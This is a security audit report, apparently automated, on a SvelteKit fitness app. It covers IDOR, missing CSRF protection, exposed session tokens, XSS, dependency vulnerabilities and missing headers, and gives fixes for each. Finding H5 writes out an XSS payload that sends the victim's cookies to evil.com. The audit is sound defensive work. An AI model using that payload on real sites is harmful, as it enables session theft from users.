# GymCraft Security Audit Report

**Date:** 2026-04-04
**Branch:** `feat/security-audit`
**Auditor:** Automated (Claude Code)

---

## Executive Summary

This audit identified **36 security findings** across the GymCraft SvelteKit application: **4 Critical**, **11 High**, **12 Medium**, and **9 Low/Informational**. The most severe issues involve missing authorization checks on API endpoints (IDOR vulnerabilities), absent CSRF protection, session token mishandling, and 43 known dependency vulnerabilities (4 critical, 21 high).

**Note:** `.env` files are properly gitignored and were never committed to git history. However, secrets in those files should still be rotated if they were ever shared or exposed outside of this machine.

| Severity | Count |
| -------- | ----- |
| Critical | 4     |
| High     | 11    |
| Medium   | 12    |
| Low/Info | 9     |

---

## Critical Findings

### C1. IDOR - API Endpoints Missing Authorization Checks

**Severity:** CRITICAL
**Category:** Broken Access Control (OWASP A01)

Nearly all API endpoints accept `userId` from URL parameters or request body without verifying the authenticated user owns the resource. An attacker can read, modify, or delete any user's data by changing the ID.

**Affected endpoints:**

| Endpoint                            | Method | File                                                          | Issue                                                     |
| ----------------------------------- | ------ | ------------------------------------------------------------- | --------------------------------------------------------- |
| `/api/plans/[id]`                   | POST   | `src/routes/api/plans/[id]/+server.ts:5-20`                   | Updates any plan - `userId` from body, no ownership check |
| `/api/plans/[id]`                   | DELETE | `src/routes/api/plans/[id]/+server.ts:22-42`                  | Deletes any plan - `userId` from body                     |
| `/api/user/[id]/plans`              | GET    | `src/routes/api/user/[id]/plans/+server.ts:4-14`              | Reads any user's plans - no auth check                    |
| `/api/user/[id]/garmin/check-email` | GET    | `src/routes/api/user/[id]/garmin/check-email/+server.ts:5-12` | Reads any user's Garmin email                             |
| `/api/user/[id]/garmin/save-email`  | POST   | `src/routes/api/user/[id]/garmin/save-email/+server.ts:5-14`  | Writes Garmin email to any account                        |
| `/api/user`                         | DELETE | `src/routes/api/user/+server.ts:6-28`                         | Accepts `userId` from body, not session                   |
| `/api/email-verification/[userId]`  | POST   | `src/routes/api/email-verification/[userId]/+server.ts:6-19`  | Triggers verification email for any user                  |

**Root cause in Prisma layer** (`src/lib/prisma/prisma.ts:86-94`):

```typescript
export async function updatePlanName(planId: string, newName: string, userId: string): Promise<Plan> {
    cache.del(`plans_${userId}`);
    return await db.plan.update({
        where: { id: planId }, // Only filtered by planId, not by userId
        data: { name: newName },
    });
}
```

**Recommendation:** Extract `userId` from `locals.user` (set by `hooks.server.ts`) on every endpoint. Never trust `userId` from request body or URL params for authorization decisions.

---

### C2. Missing CSRF Protection

**Severity:** CRITICAL
**Category:** Cross-Site Request Forgery (OWASP A01)

SvelteKit's built-in `checkOrigin` CSRF protection is **not enabled** (`svelte.config.js` has no `csrf` configuration). All state-changing endpoints accept requests from any origin.

**File:** `svelte.config.js` (missing `csrf: { checkOrigin: true }`)

**Affected:** All POST/DELETE endpoints in `src/routes/api/` and all form actions.

**Recommendation:** Add to `svelte.config.js`:

```javascript
kit: {
    csrf: { checkOrigin: true },
    // ...existing config
}
```

---

### C3. Session Token Passed in Request Bodies Instead of Cookies

**Severity:** CRITICAL
**Category:** Broken Authentication (OWASP A07)

The session token is exposed to client-side JavaScript and sent in JSON request bodies, bypassing the `httpOnly` cookie protection.

**Files:**

- `src/lib/utils/user.ts:37` - session token included in user object sent to client
- `src/models/user/user.model.ts:10` - `session: string` field in client model
- `src/routes/app/create-plan/+page.svelte:35,50` - session sent in fetch body
- `src/routes/api/plans/+server.ts:8-16` - endpoint reads session from body

```typescript
// create-plan/+page.svelte - session sent in request body
const response = await fetch('/api/plans', {
    method: 'POST',
    body: JSON.stringify({ session: data.user.session, plan }),
});
```

**Risk:** Token accessible via XSS, browser dev tools, request logging, and network interception.

**Recommendation:** Use `event.cookies.get('session')` or `locals.user` on server endpoints. Remove session token from client-side user objects entirely.

---

### C4. Vulnerable Dependencies (43 vulnerabilities: 4 critical, 21 high)

**Severity:** CRITICAL
**Category:** Vulnerable Components (OWASP A06)

```
43 vulnerabilities (3 low, 15 moderate, 21 high, 4 critical)
```

**Critical packages:**

| Package             | Vulnerability                              | Impact             |
| ------------------- | ------------------------------------------ | ------------------ |
| `form-data`         | Unsafe random in boundary                  | Request smuggling  |
| `xmldom`            | XML injection via CDATA                    | Markup injection   |
| `nodemailer@6.10.1` | SMTP injection, email to unintended domain | Email spoofing/DoS |
| `undici`            | HTTP smuggling, unbounded decompression    | Request hijacking  |

**High-severity packages:**

| Package                                         | Vulnerability                    |
| ----------------------------------------------- | -------------------------------- |
| `bcrypt` (via `tar`/`@mapbox/node-pre-gyp`)     | Arbitrary file overwrite         |
| `html2pdf.js@0.9.3` (via `canvg`/`lodash`)      | Prototype pollution              |
| `@sveltejs/kit@1.30.4` (via `cookie`/`devalue`) | XSS in dev 404 page              |
| `svelte`                                        | Multiple SSR XSS vulnerabilities |

**Recommendation:** Run `npm audit fix` (non-breaking) and `npm audit fix --force` (breaking) with testing. Prioritize `nodemailer`, `bcrypt`, and `@sveltejs/kit` upgrades.

---

## High Findings

### H1. No Rate Limiting on Authentication Endpoints

**Severity:** HIGH
**Category:** Brute Force (OWASP A07)

No rate limiting exists on any endpoint. Login, registration, email verification resend, and account deletion are all unlimited.

**Files:**

- `src/routes/app/login/+page.server.ts`
- `src/routes/app/register/+page.server.ts`
- `src/routes/api/email-verification/[userId]/+server.ts`

**Recommendation:** Implement IP-based rate limiting (e.g., 5 login attempts per 15 min, 3 registrations per hour per IP). Use SvelteKit hooks or a package like `rate-limiter-flexible`.

---

### H2. Session Token Stored in Plaintext in Database

**Severity:** HIGH
**Category:** Broken Authentication (OWASP A07)

**File:** `prisma/schema.prisma:18`, `src/routes/app/login/+page.server.ts:37`

The `userAuthToken` is stored as plaintext in the database. If the DB is compromised, all active sessions are immediately hijackable.

**Recommendation:** Hash session tokens before storage (using SHA-256). Compare incoming tokens by hashing and matching against stored hashes.

---

### H3. No Server-Side Session Invalidation on Logout

**Severity:** HIGH
**Category:** Broken Authentication (OWASP A07)

**File:** `src/routes/app/logout/+page.server.ts:10-13`

```typescript
cookies.set('session', '', {
    path: '/',
    expires: new Date(0),
});
```

Logout only clears the client cookie. The `userAuthToken` remains valid in the database and can be reused if stolen.

**Recommendation:** Set `userAuthToken` to `null` in the database on logout.

---

### H4. Insufficient Password Hashing Cost Factor

**Severity:** HIGH
**Category:** Cryptographic Failures (OWASP A02)

**File:** `src/routes/app/register/+page.server.ts:53`

```typescript
passwordHash: await bcrypt.hash(password, 10);
```

bcrypt cost factor 10 is below current recommendations (12+). At cost 10, ~10 hashes/sec on modern hardware makes brute-force feasible for weak passwords.

**Recommendation:** Increase to cost factor 12 or higher.

---

### H5. innerHTML XSS in PDF Generation

**Severity:** HIGH
**Category:** XSS (OWASP A03)

**File:** `src/lib/components/download-as-pdf/DownloadAsPdf.svelte:38`

```typescript
function htmlStringToElement(html: string): HTMLElement {
    const container = document.createElement('div');
    container.innerHTML = html; // No sanitization
    return container;
}
```

The HTML comes from `generateFullPlanDescription()` which interpolates user-controlled plan data (names, descriptions, exercises) without escaping.

**Attack:** A plan named `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` would execute.

**Recommendation:** Use a sanitization library (DOMPurify) before assigning to `innerHTML`, or escape HTML entities in plan data.

---

### H6. XSS via Skeleton UI Modal with User Data

**Severity:** HIGH
**Category:** XSS (OWASP A03)

**File:** `src/routes/app/my-plans/+page.svelte:99`

```typescript
body: `<p>Are you sure you want to delete plan: ${plan.name}?</p>`;
```

Skeleton UI modals render `body` as HTML. If `plan.name` contains HTML/JS, it will execute.

**Recommendation:** Escape `plan.name` before interpolation or use a text-only modal body.

---

### H7. User Enumeration in Registration

**Severity:** HIGH
**Category:** Broken Authentication (OWASP A07)

**File:** `src/routes/app/register/+page.server.ts:30-42`

```typescript
if (userExists) return fail(400, { userExists: true });
// ...
if (emailExists) return fail(400, { emailExists: true });
```

Distinct error responses for existing username vs. existing email allow attackers to enumerate valid accounts.

**Recommendation:** Return a generic error: "Registration could not be completed. The username or email may already be in use."

---

### H8. Error Messages Expose System Details

**Severity:** HIGH
**Category:** Security Misconfiguration (OWASP A05)

**Files:**

- `src/routes/api/plans/[id]/+server.ts:38` - returns raw `(error as Error).message`
- `src/lib/server/mail.ts:51` - throws `'Error in sendVerificationToken'` (reveals function name)
- Multiple `console.log`/`console.error` calls leak operation details to server logs

**Recommendation:** Return generic error messages to clients. Log details server-side only with unique correlation IDs.

---

### H9. Console.log Statements Leaking Sensitive Information

**Severity:** HIGH
**Category:** Information Disclosure (OWASP A05)

**Files:**

| File                                                     | Line   | Content                                               |
| -------------------------------------------------------- | ------ | ----------------------------------------------------- |
| `src/lib/server/mail.ts`                                 | 50     | `console.log('Error in sendVerificationToken:', err)` |
| `src/lib/server/mail.ts`                                 | 73, 76 | Mail operation logging                                |
| `src/lib/prisma/prisma.ts`                               | 175    | `console.log('User verified successfully')`           |
| `src/routes/app/verify/[userId]/[token]/+page.server.ts` | 9      | Verification logging                                  |
| `src/routes/app/+page.server.ts`                         | 5      | `console.log(\`env: ${PUBLIC_APP_ENV}\`)`             |
| `src/routes/api/user/+server.ts`                         | 24     | `console.error(deleteError)`                          |

**Recommendation:** Replace with structured logging (Pino/Winston) with appropriate log levels. Never log to stdout in production.

---

### H10. Garmin Credentials Handling

**Severity:** HIGH
**Category:** Sensitive Data Exposure (OWASP A02)

**File:** `src/routes/app/my-plans/[id]/+page.svelte:165-176`

User's Garmin Connect password is collected in the browser and sent over POST. If HTTPS is not enforced, credentials are exposed.

**Recommendation:** Ensure HTTPS is always enforced. Consider OAuth-based Garmin integration instead of collecting raw credentials. Display a warning about entering third-party credentials.

---

### H11. Insecure Client-Side Cookie Setter

**Severity:** HIGH
**Category:** Broken Authentication (OWASP A07)

**File:** `src/lib/utils/cookies.ts:1-14`

```typescript
export function setCookie(name: string, value: string, days: number) {
    // ...
    document.cookie = name + '=' + (value || '') + expires + '; path=/';
}
```

This client-side cookie utility sets cookies without `Secure`, `HttpOnly`, or `SameSite` flags. It is used in `src/routes/app/my-account/+page.svelte:40`. Any cookie set through this function is vulnerable to interception (no `Secure`), XSS theft (no `HttpOnly`), and CSRF (no `SameSite`).

**Recommendation:** Remove this utility or restrict it to non-sensitive cookies only. All auth-related cookies must be set server-side with proper flags.

---

## Medium Findings

### M0. Incomplete Logout Cookie Clearing

**File:** `src/routes/app/logout/+page.server.ts:10-13`

```typescript
cookies.set('session', '', {
    path: '/',
    expires: new Date(0),
});
```

The logout cookie-clearing call is missing `httpOnly`, `secure`, and `sameSite` flags that were set during login. Inconsistent flags may cause browsers to treat this as a different cookie, leaving the original session cookie intact.

**Recommendation:** Mirror all flags from the login cookie set call: `httpOnly: true`, `sameSite: 'strict'`, `secure: isProduction()`.

---

### M1. No Email Verification Enforcement

**File:** `src/lib/utils/user.ts:8-19`

Users can log in and use the app immediately after registration without verifying their email. The `emailVerified` flag exists but is not checked during login.

**Recommendation:** Check `emailVerified` status during login. Restrict unverified users to a limited set of actions.

---

### M2. Verification Token Exposed in URL

**File:** `src/lib/utils/email-verification.ts:6`

```typescript
<a href="${baseUrl}/verify/${userId}/${token}">Activate your account</a>
```

Token is visible in browser history, server logs, referrer headers, and email provider systems.

**Recommendation:** Use POST-based verification or short-lived one-time tokens.

---

### M3. No Content Security Policy (CSP)

**Files:** `svelte.config.js`, `src/app.html` (no CSP configuration found)

No CSP headers are configured, allowing unrestricted script/style/image sources and enabling XSS exploitation.

**Recommendation:** Add CSP headers via SvelteKit hooks or Netlify deployment config. Start with a restrictive policy and loosen as needed.

---

### M4. No X-Frame-Options / Clickjacking Protection

No `X-Frame-Options` or `frame-ancestors` CSP directive is set. The app can be embedded in iframes on malicious sites.

**Recommendation:** Add `X-Frame-Options: DENY` header.

---

### M5. No Security Response Headers

**Files:** No `netlify.toml` found, no header configuration in `hooks.server.ts`

Missing headers:

- `Strict-Transport-Security` (HSTS)
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: strict-origin-when-cross-origin`

**Recommendation:** Add security headers in `hooks.server.ts` resolve function or create `netlify.toml`:

```toml
[[headers]]
  for = "/*"
  [headers.values]
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    Strict-Transport-Security = "max-age=31536000; includeSubDomains"
    Referrer-Policy = "strict-origin-when-cross-origin"
```

---

### M6. No Input Validation on API Request Bodies

**Files:**

- `src/routes/api/plans/+server.ts:28-37` - plan object not validated (description, workouts accept anything)
- `src/routes/api/user/[id]/garmin/save-email/+server.ts:7` - email not validated
- `src/routes/api/plans/[id]/+server.ts:14` - plan name not validated

**Recommendation:** Use a schema validation library (Zod) to validate all request bodies. Validate types, lengths, and formats.

---

### M7. Weak UUID Validation on Route Parameters

All `[id]`, `[userId]`, `[token]` route parameters lack format validation. Invalid values reach database queries unchecked.

**Recommendation:** Validate UUID format before processing. Return 400 for invalid formats.

---

### M8. Google Analytics Without Nonce/SRI

**File:** `src/app.html:8-17`

```html
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Y1QGJKBJ0E"></script>
```

External script loaded without Subresource Integrity (SRI) hash. If the CDN is compromised, arbitrary code executes on your domain.

**Recommendation:** Add `integrity` and `crossorigin` attributes. When CSP is implemented, add proper nonce handling.

---

### M9. Development Mode Bypasses

**File:** `src/lib/components/survey/SurveyForm.svelte:120-122`

```typescript
if (PUBLIC_APP_ENV === 'development') {
    formData = formDataMock;
}
```

Development-only code paths exist in production bundles. If `PUBLIC_APP_ENV` is misconfigured, mock data is used.

**Recommendation:** Use build-time dead code elimination or move dev-only code behind Vite's `import.meta.env.DEV`.

---

### M10. Email Uniqueness Only Enforced in Production

**File:** `src/routes/app/register/+page.server.ts:36-42`

```typescript
if (isProduction()) {
    const emailExists = await db.user.findFirst({ where: { email } });
    if (emailExists) return fail(400, { emailExists: true });
}
```

Email uniqueness is skipped in development, allowing duplicate emails.

**Recommendation:** Enforce in all environments for consistency and to catch bugs early.

---

### M11. Client-Side Cookie Utility

**File:** `src/lib/utils/cookies.ts`

Custom client-side cookie management exists alongside httpOnly server cookies. Client-accessible cookies can be read by XSS attacks.

**Recommendation:** Use server-side cookie management exclusively for auth-related cookies.

---

## Low / Informational Findings

### L1. Weak Session Token Entropy

**Files:** `src/routes/app/login/+page.server.ts:37`, `src/routes/app/register/+page.server.ts:54`

`crypto.randomUUID()` provides 122 bits of entropy. While acceptable, 256-bit tokens (`crypto.randomBytes(32).toString('hex')`) are preferred for session tokens.

---

### L2. Session Cookie Secure Flag Disabled in Development

**File:** `src/routes/app/login/+page.server.ts:44`

`secure: isProduction()` allows HTTP transmission in development. Acceptable for local dev but document the risk.

---

### L3. Public Path Matching Uses startsWith

**File:** `src/hooks.server.ts:5-14`

```typescript
const publicPaths = ['/app/register', '/app/login', '/app/verify'];
```

Using `startsWith()` for matching means `/app/login-admin` would also be public. Use exact matching or regex.

---

### L4. 30-Day Session Expiry

**File:** `src/routes/app/login/+page.server.ts:45`

`maxAge: 60 * 60 * 24 * 30` (30 days) is long for a fitness app handling personal data. Consider 7-day sessions with refresh tokens.

---

### L5. No Audit Logging

No audit trail for sensitive operations (account deletion, plan modifications, failed logins). Required for incident response and compliance.

---

### L6. No Password Breach Check

**File:** `src/lib/utils/form-validation.ts`

No check against known breached passwords (e.g., HaveIBeenPwned API). Users can set commonly breached passwords.

---

### L7. Database Connection Not Properly Managed for Serverless

**File:** `src/lib/database.ts`

Single global `PrismaClient` instance without serverless-aware initialization. May cause connection pool exhaustion on Netlify Functions.

---

### L8. No API Rate Limiting Documentation

No documentation of expected API usage patterns or rate limits for external integrations (AI proxy, Garmin microservice).

---

### L9. User PII Exposed in Page Stores

**Files:** `src/routes/app/+page.server.ts:7`, `src/routes/app/+layout.server.ts:4-7`

User objects including email and personal data are passed to client-side page stores. Only send the minimum needed fields.

---

## Remediation Priority

### Immediate (Today)

1. **C1** - Add authorization checks to all API endpoints (use `locals.user`)
2. **C2** - Enable `csrf: { checkOrigin: true }` in `svelte.config.js`
3. **C3** - Remove session token from client-side user objects; use cookies server-side

### This Week

4. **C4** - Run `npm audit fix`; upgrade `nodemailer`, `bcrypt`, `@sveltejs/kit`
5. **H1** - Implement rate limiting on login/registration
6. **H2** - Hash session tokens before database storage
7. **H3** - Invalidate session token in DB on logout
8. **H5/H6** - Sanitize user data before HTML rendering

### This Sprint

9. **H4** - Increase bcrypt cost factor to 12
10. **H7** - Use generic error messages for registration
11. **H8/H9** - Replace console.log with structured logging
12. **M1** - Enforce email verification before login
13. **M3/M4/M5** - Add security headers (CSP, HSTS, X-Frame-Options)
14. **M6** - Add Zod validation on all API request bodies

### Backlog

15. **L1-L9** - Session entropy, audit logging, password breach checks, serverless DB handling
